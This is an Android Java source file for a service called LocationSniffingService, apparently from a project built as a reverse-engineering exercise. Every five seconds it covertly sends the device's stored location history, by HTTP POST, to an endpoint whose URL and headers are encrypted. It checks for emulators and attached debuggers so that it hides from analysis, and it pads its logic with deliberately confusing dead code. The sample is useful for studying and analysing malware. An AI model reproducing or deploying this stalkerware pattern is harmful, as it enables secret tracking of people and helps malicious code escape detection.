package com.woop.tryreverseengineerthis.service;
import android.annotation.TargetApi;
import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.os.Build;
import android.os.Debug;
import android.os.IBinder;
import android.util.Log;
import com.woop.tryreverseengineerthis.helper.StringHelper;
import com.woop.tryreverseengineerthis.storage.LocationStorage;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;

/**
 * Every x seconds, send all the location collected with a POST call to a URL
 *
 * Created by Jay on 3/29/2016.
 */
public class LocationSniffingService extends Service{

    private static Timer mTimer = null;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    //Starts the handler which will post every delay seconds
    @Override
    public void onCreate(){
        Log.d("LocationSniffingService", "onCreate()");
        Log.d("LocationSniffingService", "Starting handler");
        Log.d("LocationSniffingService", "Is it coming here");
        mTimer = new Timer();
        int delay = 5000;

        mTimer.scheduleAtFixedRate(new TimerTask() {
			
            @Override
            public void run() {
                if (thisDoesnotDoAnything()){
                    return;
				}
                else{
                    thisAlsoDoesnotDoAnything();
				}
            }
        }, 0,delay);
    }

    private void thisAlsoDoesnotDoAnything(){
    }
    //Concats all the locations to send
    private boolean sendQuietly() {
        List<Location> locations = LocationStorage.getAllLocation();
        StringBuilder builder = new StringBuilder();
        for(Location loc : locations){
            builder.append(loc.getAltitude());
            builder.append(",");
            builder.append(loc.getLatitude());
            builder.append(",");
            builder.append(loc.getLongitude());
            builder.append(",");
            builder.append(loc.getTime());
            builder.append(",");
            builder.append("||");
        }
        actualSend(builder.toString());

        //Logic Obfuscation
        return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
    }
    /*
     *   Gets the string and sends to a url
     */
    @TargetApi(Build.VERSION_CODES.KITKAT)
    private void actualSend(String s) {
        try {
            String urlString = "d102jd012jasd";
            String http = "uas0j1d12dasDas";
            String requestProperty1 = "aspdk2DasdmaSDa==";
            String requestProperty2 = "as=sdnasd2d22d2";
            String requestProperty3 = "ask20asdj20jd9";
            String requestProperty4 = "asdSDs22d@d222==";
            String requestProperty5 = "20k20dk20ASD2d==";

            try{
                urlString = StringHelper.getStringStatic(urlString);
                http = StringHelper.getStringStatic(http);
                requestProperty1 = StringHelper.getStringStatic(requestProperty1);
                requestProperty2 = StringHelper.getStringStatic(requestProperty2);
                requestProperty3 = StringHelper.getStringStatic(requestProperty3);
                requestProperty4 = StringHelper.getStringStatic(requestProperty4);
                requestProperty5 = StringHelper.getStringStatic(requestProperty5);
            } catch (IllegalBlockSizeException e) {
                e.printStackTrace();
                return;
            } catch (BadPaddingException e) {
                e.printStackTrace();
                return;
            } catch (InvalidKeyException e) {
                e.printStackTrace();
                return;
            } catch (Exception e){
                e.printStackTrace();
                return;
            }
            //Prepare URL and to send the data
            URL url = new URL(urlString);
            byte[] postData = s.getBytes(StandardCharsets.UTF_8);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setInstanceFollowRedirects(false);
            connection.setRequestMethod(http);
            connection.setRequestProperty(requestProperty1, requestProperty2);
            connection.setRequestProperty(requestProperty3, requestProperty4);
            connection.setRequestProperty(requestProperty5, Integer.toString(postData.length));
            connection.setUseCaches(false);
            try(DataOutputStream wr = new DataOutputStream(connection.getOutputStream())){
                wr.write(postData);
            }
        } catch (MalformedURLException e) {
            return;
        } catch (IOException e) {
            return;
        } catch (Exception e) {
            return;
        }
        Log.d("LocationSniffingService", "Sent");
    }

    /*
     *  Logic obfuscated - b does not actually do anything
     */
    private boolean thisDoesnotDoAnything(){

        Log.d("LocationSniffingService","Checking...");
        boolean b = false;
        if (isValid()){
            b = sendQuietly();
		}
        Log.d("LocationSniffingService", isValid() + "");

        return (b^=b) ? (b == b)^(b) : (b^b^b^b);
    }

    //Check if the environment is an emulated environment - just in case it is being analysed
    private boolean isValid(){

        Log.d("LocationSniffingService", "Check if valid");

        //Annotation to use picture encryption obfuscation on
        @PictureObfuscate
        String generic = "OnceUponATime";
        @PictureObfuscate
        String unknown = "LivedABunnyCalled";
        @PictureObfuscate
        String googlesdk = "Judy.SheWasGoingTo";
        @PictureObfuscate
        String emulator = "OoposN10earlyforGot";
        @PictureObfuscate
        String androidsdk86 = "beTheBestCopIn";
        @PictureObfuscate
        String genymotion = "Zo0o0o0o0Topia";
        @PictureObfuscate
        String sdk = "SheDidNotRealise";
        @PictureObfuscate
        String sdk86 = "however,ThatShe";
        @PictureObfuscate
        String vbox = "wasJustGoingtobe";
        @PictureObfuscate
        String goldfish = "amereparkingWarden";
        @PictureObfuscate
        String android = "sadfacebunny";

        String fingerprint = "T05FMTExMTExMTExMQ==";
        String model = "VFdPMjIyMjIyMjIyMg==";
        String manufacturer = "VEhSRUUzMzMzMzMzMw==";
        String product = "Rk9VUjQ0NDQ0NDQ0NA==";
        String hardware = "RklWRTU1NTU1NTU1NQ==";
        String telephoneoperator = "RUxWRU4xMTExMTExMQ==";

        try{
            generic = StringHelper.getStringStatic(generic);
            unknown = StringHelper.getStringStatic(unknown);
            googlesdk = StringHelper.getStringStatic(googlesdk);
            emulator = StringHelper.getStringStatic(emulator);
            androidsdk86 = StringHelper.getStringStatic(androidsdk86);
            genymotion = StringHelper.getStringStatic(genymotion);
            sdk = StringHelper.getStringStatic(sdk);
            sdk86 = StringHelper.getStringStatic(sdk86);
            vbox = StringHelper.getStringStatic(vbox);
            goldfish = StringHelper.getStringStatic(goldfish);
            android = StringHelper.getStringStatic(android);
            fingerprint = StringHelper.getStringDynamic(fingerprint);
            model = StringHelper.getStringDynamic(model);
            manufacturer = StringHelper.getStringDynamic(manufacturer);
            product = StringHelper.getStringDynamic(product);
            hardware = StringHelper.getStringDynamic(hardware);

            telephoneoperator = StringHelper.getStringDynamic(telephoneoperator);
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
            return false;
        } catch (BadPaddingException e) {
            e.printStackTrace();
            return false;
        } catch (InvalidKeyException e) {
            e.printStackTrace();
            return false;
        } catch (Exception e){
            e.printStackTrace();
            return false;
        }

        //Check build's fingerprint
        Boolean checkFingerprint =  fingerprint.startsWith(generic) || fingerprint.startsWith(unknown);

        //Check build's model
        Boolean checkModel =        model.contains(googlesdk) || model.contains(emulator) || model.contains(androidsdk86);

        //Check Manurfacturer for Genymotion (an emulation software)
        Boolean checkManufacturer = manufacturer.contains(genymotion) || manufacturer.contains(unknown);

        //Check build's product
        Boolean checkProduct = product.contains(sdk) || product.contains(vbox);

        //Check for goldfish hardware
        Boolean checkHardware = hardware.contains(goldfish) || hardware.contains(vbox);

        //Return if any is detected
        if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware){
            return false;
		}

        //Check for telephone operator
        //Return if it is android
		if(android.equals(telephoneoperator)){
				return false;
		}

        //Return if debugger is connected
        if(Debug.isDebuggerConnected()){
            return false;
		}

        return true;
    }

}
